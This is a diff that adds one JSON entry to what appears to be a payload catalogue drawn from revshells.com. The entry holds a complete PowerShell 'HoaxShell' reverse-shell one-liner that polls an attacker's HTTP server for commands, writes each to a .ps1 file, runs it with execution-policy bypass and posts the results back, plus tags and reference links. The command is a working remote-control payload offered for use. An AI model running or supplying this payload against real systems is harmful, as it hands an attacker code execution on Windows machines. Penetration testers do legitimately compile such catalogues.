@@ -1,0 +1,28 @@
+{
+  "id": "rsg-hoaxshell-powershell-outfile-constr-lang-mode",
+  "name": "RSG · HoaxShell · PowerShell Outfile Constr Lang Mode",
+  "command": "$s='<lhost>:<lport>';$i='e030d4f6-9393dc2a-dd9e00a7';$p='http://';$f=\"C:Users$env:USERNAME.localhack.ps1\";$v=IRM -UseBasicParsing -Uri $p$s/e030d4f6 -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/9393dc2a -Headers @{\"Authorization\"=$i}); if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/dd9e00a7 -Method POST -Headers @{\"Authorization\"=$i} -Body ($e+$r)} sleep 0.8}",
+  "description": "Hoax Shell payload — PowerShell Outfile Constr Lang Mode (via reverse-shell-generator).",
+  "platform": "windows",
+  "tags": [
+    "rsg",
+    "payload",
+    "hoax-shell",
+    "windows"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "HoaxShell/PowerShell Outfile Constr Lang Mode/109",
+  "category": "payloads",
+  "subcategory": "hoax-shell",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
